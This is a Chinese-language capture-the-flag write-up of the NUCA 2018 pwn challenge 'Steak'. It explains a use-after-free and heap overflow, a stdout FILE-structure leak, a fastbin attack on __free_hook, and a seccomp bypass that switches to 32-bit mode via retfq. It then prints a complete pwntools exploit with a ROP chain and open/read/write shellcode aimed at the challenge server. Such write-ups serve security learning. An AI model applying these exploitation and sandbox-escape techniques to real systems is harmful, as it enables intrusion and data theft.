---
title: 'NUCA:Steak'
date: 2018-11-25 21:51:56
tags: pwn rop
layout: post
---
挺长的一题...学到了不少东西
<!--more-->
# Steak
挺综合的一题感觉质量挺好的...
学到了不少东西...
[附件][1]
# Analysis

```s
➜  steak checksec steak 
[*] '/home/n132/Desktop/steak/steak'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

经过初步逆向发现以下信息
* 存在限制
```arm
  prctl(38, 1LL, 0LL, 0LL, 0LL, 42LL, &v3);
  if ( prctl(22, 2LL, &v1) )
  {
    puts("prctl");
    exit(0);
  }
```

* NOLEAK
* 存在uaf
* edit存在溢出

堆方面应该是解决了leak的问题就想怎么玩怎么玩

*  LEAK
最近研究的IO_file刚好派上用场
可以设置
```python
stdout->_flags为0xfbad1800
write_base -> partial write \x00
```
有了泄露之后就可以利用fast bin atk 
控制bss段的array 利用edit函数设置__free_hook为puts
然后扩大战果 泄露stack的值为之后正片做准备

# 正片
主要是关于seccompt过prctl
```sh
➜  steak seccomp-tools dump /home/n132/Desktop/steak/steak 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0003
 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0003: 0x35 0x00 0x01 0x000000c8  if (A < tkill) goto 0005
 0004: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0005: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0007
 0006: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0007: 0x15 0x00 0x01 0x00000029  if (A != socket) goto 0009
 0008: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0009: 0x15 0x00 0x01 0x0000002a  if (A != connect) goto 0011
 0010: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0011: 0x15 0x00 0x01 0x0000002b  if (A != accept) goto 0013
 0012: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0013: 0x15 0x00 0x01 0x0000002c  if (A != sendto) goto 0015
 0014: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0015: 0x15 0x00 0x01 0x0000002d  if (A != recvfrom) goto 0017
 0016: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0017: 0x15 0x00 0x01 0x0000002e  if (A != sendmsg) goto 0019
 0018: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0019: 0x15 0x00 0x01 0x0000002f  if (A != recvmsg) goto 0021
 0020: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0021: 0x15 0x00 0x01 0x00000030  if (A != shutdown) goto 0023
 0022: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0023: 0x15 0x00 0x01 0x00000031  if (A != bind) goto 0025
 0024: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0025: 0x15 0x00 0x01 0x00000032  if (A != listen) goto 0027
 0026: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0027: 0x15 0x00 0x01 0x00000035  if (A != socketpair) goto 0029
 0028: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0029: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0031
 0030: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0031: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0033
 0032: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0033: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0035
 0034: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0035: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0037
 0036: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0037: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0039
 0038: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0039: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0041
 0040: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0041: 0x06 0x00 0x00 0x7fff0000  return ALLOW

```
所以感觉想办法绕了
队里老师傅感觉可能能用上这篇博客
[Tokyo Westerns MMA 2016 - Diary][2]

后来发现真滴有用：D
简而言之就是通过retf转换为x86用x86的系统调用这样许多题目中的限制就鞭长莫及
所以我们要做的事情：
* 构造rop 去构造一块能执行的区域写入shellcode(open,read,write)
* 利用retf (eip=shellcode_address,cs=0x23)//0x33是x64

1.第一点的话用systemcall的第0xa调用sys_mprotect
set mode =0x7 这样就可rwx

2.retf 后跟shellcode的地址，0x23

3.shellcode open，read，write
//这里发现如果直接认为是fd是3的话本地能成，远端读不到...最好使用open后的返回值rax

# exp

概率性脚本1/256
可以优化一下到1/16利用copy的功能
```python
from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter(">\n",str(c))
def add(size,data="\n"):
	cmd(1)
	p.sendlineafter("size:\n",str(size))
	p.sendafter("buf:\n",data)
def free(idx):
	cmd(2)
	p.sendlineafter("index:\n",str(idx))
def edit(idx,buf,size=0x100):
	cmd(3)
	p.sendlineafter("index:\n",str(idx))
	p.sendlineafter("size:\n",str(size))
	p.sendafter("buf:\n",buf)
def C(c):
	p.sendlineafter(">",str(c))
def A(size,data="\n"):
	C(1)
	p.sendlineafter("size:",str(size))
	p.sendafter("buf:",data)
def F(idx):
	C(2)
	p.sendlineafter("index:",str(idx))
def E(idx,buf,size=0x100):
	C(3)
	p.sendlineafter("index:",str(idx))
	p.sendlineafter("size:",str(size))
	p.sendafter("buf:",buf)
def cp(a,b,lenth=8):
	C(4)
	p.readuntil("index:")
	p.sendline(str(a))
	p.readuntil("index:")
	p.sendline(str(b))
	p.sendlineafter("length:",str(lenth))
def lea():
	C()
def sss(rax,rdi,rsi,rdx):
	return p64(pop_rax+libc.address) + p64(rax) + p64(ps)+p64(rsi)+p64(0)+p64(pd)+p64(rdi) + p64(pop_rdx+libc.address) + p64(rdx) + p64(syscall+libc.address)
#p=process("./steak",env = {"LD_PRELOAD": "./libc-2.23.so"})

#p=process("./steak")
p=remote("10.21.13.69",60001)
#p=process("./steak")
binary=ELF("./steak")
libc=binary.libc
add(0x68,'\n')#0
add(0x68,'\n')#1
add(0x68,'\n')#2
add(0x90,'\n')#3
add(0x90,'\n')#4
free(0)
free(1)
free(3)
edit(2,"A"*0x68+p64(0x71)+"\xdd\x25")
edit(0,"A"*0x68+p64(0x71)+'\x50\x31')
add(0x68)#5
add(0x68)#6

add(0x68,"\x00"*3+p64(0)*6+p64(0xfbad1800)+p64(0)*3+"\x00")#7
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x00007ffff7a0d000)
libc.address=base
log.warning(hex(base))
A(0x68)#8

A(0x68)#9
A(0x68)#10
A(0x68)#11
F(9)
F(10)
E(10,p64(0x6021A0-19))
A(0x68)#11
A(0x68,"\x00"*3+p64(libc.symbols['__free_hook'])+p64(libc.symbols['__malloc_hook'])+p64(libc.symbols['environ'])+p64(0x6021A0))#12
E(0,p64(libc.symbols['puts']))
F(2)
p.readline()
stack=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7fffffffdf78-0x00007ffffffde000)
log.warning(hex(stack))
ret_addr=0xdeadbeef

E(3,p64(libc.symbols['__free_hook'])+p64(libc.symbols['__malloc_hook'])+p64(0x7fffffffde88-0x00007ffffffde000+stack-8)+"/bin/sh\x00" + p64(0x602240) + p64(0x602800))
pd=0x0000000000400ca3
ps=0x0000000000400ca1#pop rsi; pop r15; ret;
pop_rdx = 0x0000000000001b92#pop rdx;ret;
syscall = 0x00000000000bc375#syscall; ret;
pop_rax = 0x0000000000033544#pop_rax; ret;
pop_r10 = 0x00000000001150a5#pop r10;ret
leave = 0x00000000004008d7#leave;ret
retfq = 0x0000000000107428
ski=0x0000000000400291
rop =p64(0x602800-8)+ sss(0xa,0x602000,0x1000,0x7)+p64(leave)

shellcode=asm(shellcraft.open("./flag"))
leak='''
mov ebx, eax
mov eax,3
mov ecx,0x602900
mov edx,0x72
int 0x80
mov eax,0x4
mov ebx,0x1
mov ecx,0x602900
mov edx,0x30
int 0x80
'''
shellcode+=asm(leak)

shellcode_addr=0x602240
#gdb.attach(p,'b *0x000000000400C3A')
E(5,p64(retfq+libc.address) + p64(shellcode_addr) + p64(0x23))# switch the mode from 64bit to 32bit 
E(4,shellcode)
E(2,rop)
p.sendline("6")
p.interactive()

```

# review
堆栈结合，加上seccomp 挺综合的
还是tcl见识少...学到了不少


[1]: https://github.com/n132/Watermalon/tree/master/NUCA_2018
[2]: http://uaf.io/exploitation/2016/09/06/TokyoWesterns-MMA-Diary.html